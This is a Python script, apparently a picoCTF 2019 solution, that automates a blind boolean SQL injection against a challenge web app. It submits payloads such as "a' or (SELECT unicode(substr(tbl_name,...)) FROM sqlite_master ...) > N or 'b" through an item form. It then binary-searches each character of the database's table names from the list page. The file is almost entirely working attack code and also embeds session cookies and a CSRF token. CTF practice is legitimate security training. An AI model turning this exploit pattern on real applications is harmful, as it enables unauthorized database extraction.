import requests

yes = '''				<strong>Very Urgent:</strong> 1
				</li> 
			</div>
		</div>
	</div>
	
	</ul>



			</div>
'''
res = ''
for i in range(1,1000):
	l = 0
	r = 255
	while l <= r:
		m = (l+r)//2
		# a' or (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char') or 'b
		inject = "(SELECT unicode(substr(tbl_name,{},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > {}".format(i,m)
		payload = "a' or "+ inject +" or 'b"
		print payload
		burp0_url = "https://2019shell1.picoctf.com:443/problem/37779/add_item"
		burp0_cookies = {"_ga": "GA1.2.515232083.1551089444", "_gid": "GA1.2.1451714050.1569680322", "io": "jzy_zd8S0DvF6bAUAA-H", "session": ".eJwlj0tOBDEMBe-S9SwSx_FnLtOyHVsgEEjdsELcnZbYvUWVVO-nHXXm9dKeZe9XPtrxutuzLXHgxWnJ1iPFps0akqtruUJsk4WgHZ3dWUVZZkemolngqXOVgzD5FujWkcQMdw3woBCuGLt7TbkniirSINopuMKKSGd7tLjOOr4-3_Lj7jGcUWkrVMVkjLwpn7tnIQ7WAcQBpHp731ee_ycAqP3-AWdaP1w.XZGTIw.Jmz57XvxaqgKX3_NK8lTy-2AiWE"}
		burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://2019shell1.picoctf.com", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3521.2 Safari/537.36 OPR/57.0.3072.0 (Edition developer)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "https://2019shell1.picoctf.com/problem/37779/add_item", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
		burp0_data = {"csrf_token": "ImE0M2NmZWE1Yzk5OGE4MTFlZjY2YjNkMGVmNDQxNzkxMjY3YzI2OTki.XZGR7g.46CjH4ZF5rye8ci4M_RYJhcbZUs", "item": payload, "submit": "Create"}
		resp1 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

		burp0_url = "https://2019shell1.picoctf.com:443/problem/37779/list_items"
		burp0_cookies = {"_ga": "GA1.2.515232083.1551089444", "_gid": "GA1.2.1451714050.1569680322", "io": "jzy_zd8S0DvF6bAUAA-H", "session": ".eJwlj01qQzEMhK8SvM7CP7IsvV2XPUMJQbKlpjRJ4Tldhdy9hq5mBr6BmWc4-1XmxWbYPp7h8FgSbjanfFo4hveH3Q5vY9gIp9fpuODd5iVsLtdpK36NsIVKmlttJtYkdiMpUjyR1ciunPsQqpA5gjbVxsSNSoSGjsWzGpfqmqmhDspRIiCJwPCUtWOn5j2NqF5oWSBmwIQ4jKB2cUQua2efu58fP992X3sESneT2plJKCVblJYRzQFS45Sx9YzMq_c7bf8_kTOG1x-AmE3f.XZGT3g.f7_LxONPaV4lYM4nYoTdr_9VFkI"}
		burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3521.2 Safari/537.36 OPR/57.0.3072.0 (Edition developer)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
		resp2 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
		print chr(m)
		if yes in resp2.text:
			l = m+1
		else:
			r = m-1
	res += chr(l)
	print res


	# print resp1.text
	# print '-'*40
	# print resp2.text
	# print (yes in resp2.text)
